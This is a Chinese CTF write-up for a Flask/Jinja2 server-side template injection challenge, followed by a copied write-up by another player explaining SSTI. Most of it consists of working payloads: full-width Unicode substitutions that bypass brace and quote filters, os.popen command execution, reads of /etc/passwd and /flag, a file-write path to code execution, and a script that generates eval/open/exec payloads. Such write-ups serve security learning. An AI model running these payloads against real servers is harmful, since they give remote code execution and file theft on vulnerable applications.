---
tags:
  - CTF
  - web
  - SSTI
---
![](图片/Pasted%20image%2020241222001420.png)![](图片/Pasted%20image%2020241222001433.png)
发现server是python 3.7.12
猜测为flask ssti模板注入，首先测试{{1}}
![](图片/Pasted%20image%2020241222001634.png)
尝试使用不一样的{{}}
![](图片/Pasted%20image%2020241222001741.png)
发现可以 存在ssti漏洞
```
"""
{ -> ︷/﹛
} -> ︸/﹜
' -> ＇
, -> ，
" -> ＂
"""
//此时的str即你要输入的payload
str = '''{{a.__init__.__globals__.__builtins__.eval("__import__('os').popen('ls').read()")}}''' # 原字符串
# 如果需要替换replace(被替换的字符,替换后的字符)
str = str.replace('{', '︷')
str = str.replace('}', '︸')
str = str.replace('\'', '＇')
str = str.replace('\"', '＂')

print(str)

```
![](图片/Pasted%20image%2020241222002351.png)
替换中英文字符 绕过防御
构建最后payloads
```
︷︷a.__init__.__globals__.__builtins__.eval(＂__import__(＇os＇).popen(＇ls＇).read()＂)︸︸
```



```
︷︷a.__init__.__globals__.__builtins__.eval(＂__import__(＇os＇).popen(＇ls /＇).read()＂)︸︸
```

![](图片/Pasted%20image%2020241222002631.png)


```
︷︷a.__init__.__globals__.__builtins__.eval(＂__import__(＇os＇).popen(＇cat /flag＇).read()＂)︸︸
```
![](图片/Pasted%20image%2020241222002736.png)

--- 
## 他人wp
### python-flask-ssti(模版注入漏洞)

SSTI(Server-Side Template Injection) 服务端模板注入，就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式

#### ssti漏洞成因

ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本题目是考察对flask模板注入。

#### 模板引擎

首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。

模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。

通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。

后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。

前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。

#### 前置知识

**1.运行一个一个最小的 Flask 应用**

解释

`from flask import Flask app = Flask(__name__)  @app.route('/') def hello_world():     return 'Hello World!'  if __name__ == '__main__':     app.run(host='0.0.0.0')`

**2.jinja2**

jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。

在jinja2中，存在三种语：

```
控制结构 {% %}
变量取值 {{ }}
注释 {# #}
```

`jinja2模板中使用 {{ }} 语法表示一个变量`，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等

inja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。

被两个括号包裹的内容会输出其表达式的值

**1.ssti漏洞的检测**  
发送类似下面的payload，不同模板语法有一些差异

解释

`smarty=Hello ${7*7} Hello 49 twig=Hello {{7*7}} Hello 49`

检测到模板注入漏洞后，需要准确识别模板引擎的类型。神器Burpsuite 自带检测功能，并对不同模板接受的 payload 做了一个分类，并以此快速判断模板引擎：

![1.png](https://adworld.xctf.org.cn/media/common/9c086b8f-c01a-4c20-be41-18fa70159bea.png)

**2.漏洞利用**  
1.payload原理  
Jinja2 模板中可以访问一些 Python 内置变量，如[] {} 等，并且能够使用 Python 变量类型中的一些函数这里其实就引出了`python沙盒逃逸`

python的内敛函数真是强大，可以调用一切函数做自己想做的事情

```
__builtins__
__import__
```

---


```python
`C:\Users\Shelby\Desktop λ python Python 3.7.8 (tags/v3.7.8:4b47a5b6ba, Jun 28 2020, 08:53:46) [MSC v.1916 64 bit (AMD64)] on win32 Type "help", "copyright", "credits" or "license" for more information. >>> dir('builtins') ['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill'] >>> dir('import') ['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill'] >>>`
```


在python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，这是两种创建object的方法

Python中一些常见的特殊方法：

解释

`__class__返回调用的参数类型。 __base__返回基类 __mro__允许我们在当前Python环境下追溯继承树 __subclasses__()返回子类`

现在我们的思路就是从一个内置变量调用__class__.base__等隐藏属性，去找到一个函数，然后调用其__globals[‘builtins’]即可调用eval等执行任意代码。

解释


```python
().__class__.__bases__[0] ''.__class__.__mro__[2] {}.__class__.__bases__[0] [].__class__.__bases__[0]   builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块
```


---

解释

`>>> ''.__class__.__base__.__subclasses__() # 返回子类的列表 [,,,...]  #从中随便选一个类,查看它的__init__ >>> ''.__class__.__base__.__subclasses__()[30].__init__ <slot wrapper '__init__' of 'object' objects> # wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性  #再换几个子类，很快就能找到一个重载过__init__的类，比如 >>> ''.__class__.__base__.__subclasses__()[5].__init__  >>> ''.__class__.__base__.__subclasses__()[5].__init__.__globals__['__builtins__']['eval'] #然后用eval执行命令即可`

安全研究员给出的几个常见Payload  
**python2**  
文件读取和写入

解释

`#读文件 {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}   {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}} #写文件 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") }}`

任意执行

每次执行都要先写然后编译执行

```
{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('code')}}  
{{ config.from_pyfile('/tmp/owned.cfg') }}  
```

python3  
因为python3没有file了，所以用的是open

解释


```python
#文件读取 http://192.168.228.36/?name={{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()}}   #任意执行 http://192.168.228.36/?name={{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}}    #命令执行： {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}  #文件操作 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```


寻找function的过程可以用一个小脚本解决, 脚本找到被重载过的function，然后组成payload

解释

`#!/usr/bin/python3 # coding=utf-8 # python 3.5 from flask import Flask from jinja2 import Template # Some of special names searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__', '__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__', '__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', '__call__', "__instancecheck__", '__subclasscheck__', '__len__', '__length_hint__', '__missing__','__getitem__', '__setitem__', '__iter__','__delitem__', '__reversed__', '__contains__', '__add__', '__sub__','__mul__'] neededFunction = ['eval', 'open', 'exec'] pay = int(input("Payload?[1|0]")) for index, i in enumerate({}.__class__.__base__.__subclasses__()):     for attr in searchList:         if hasattr(i, attr):             if eval('str(i.'+attr+')[1:9]') == 'function':                 for goal in neededFunction:                     if (eval('"'+goal+'" in i.'+attr+'.__globals__["__builtins__"].keys()')):                         if pay != 1:                             print(i.__name__,":", attr, goal)                         else:                             print("{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='" + i.__name__ + "' %}{{ c." + attr + ".__globals__['__builtins__']." + goal + "(\"[evil]\") }}{% endif %}{% endfor %}")`

### 回顾本题

![2.png](https://adworld.xctf.org.cn/media/common/db1c53fb-9b9f-489e-849f-4cec8dbc0dfc.png)  
抓包发现是python3.7.9，而且有输入框，第一反应想到的便是ssti模板注入，但是过滤了`{ }`，之前遇到的都是过滤了`{{`，这种还好绕过，回归到题目，发现了

![3.png](https://adworld.xctf.org.cn/media/common/194101be-c30e-43eb-b3ff-e12f4b432276.png)  
字符规范器，是不是找一些特殊字符可以恢复成`{`这种形式，就找一下跟`{`类似的特殊符号试一下

特殊字符网址：http://www.fhdq.net/

![4.png](https://adworld.xctf.org.cn/media/common/e1b31962-19fe-4631-8ba7-8938ab590ad1.png)

![5.png](https://adworld.xctf.org.cn/media/common/e6c46820-41db-486e-98c5-2aa0feb698d4.png)

可以替换成功

```
︷︷config︸︸
```

![6.png](https://adworld.xctf.org.cn/media/common/febc241a-16d9-4ab9-89f3-f1d415565aad.png)

在测试过程中发现单引号也被过滤掉，`＇`这个符号可以转换出`'`

![7.png](https://adworld.xctf.org.cn/media/common/7bb6f0bc-4d2a-49c3-9487-06b8d5016e97.png)

构造如下payload

```
︷︷().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[＇open＇](＇/etc/passwd＇).read()︸︸
```

![8.png](https://adworld.xctf.org.cn/media/common/878737d8-1e4b-422d-9192-14a3c6c74833.png)  
可以读出`/etc/passwd`文件的内容，最后读取flag就可以了

```
︷︷().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[＇open＇](＇/flag＇).read()︸︸
```

![9.png](https://adworld.xctf.org.cn/media/common/836bef94-3f94-47f3-88ab-4a816804352d.png)  
也可以构造这样payload获取flag

```
︷︷().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[＇eval＇](＂__import__(＇os＇).popen(＇cat /flag＇).read()＂)︸︸
```

**TIPS说在最后**

function需要自己寻找

![10.png](https://adworld.xctf.org.cn/media/common/af09d043-0f95-42d9-b5b4-0f5216ad7fc9.png)

![11.png](https://adworld.xctf.org.cn/media/common/5e7e19b2-647a-4945-9858-719781276483.png)  
︷︷().**class**.**bases**[0].**subclasses**()︸︸  
︷︷().**class**.**bases**[0].**subclasses**()[176]︸︸  
︷︷().**class**.**bases**[0].**subclasses**()[177]︸︸

单引号被过滤，也可使用request.args来进行绕过。POST提交数据

![12.png](https://adworld.xctf.org.cn/media/common/3ef96a29-a3a5-4d1e-9bb9-f5e957d94aef.png)  
http://192.168.68.128:32771/?shy1=open&shy2=/flag

```
str=︷︷().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[request.args.shy1](request.args.shy2).read()︸︸
```

Unicode字符



`｛	&#65371; ｝	&#65373; ［	&#65339; ］	&#65341; ＇	&#65287; ＂	&#65282;`



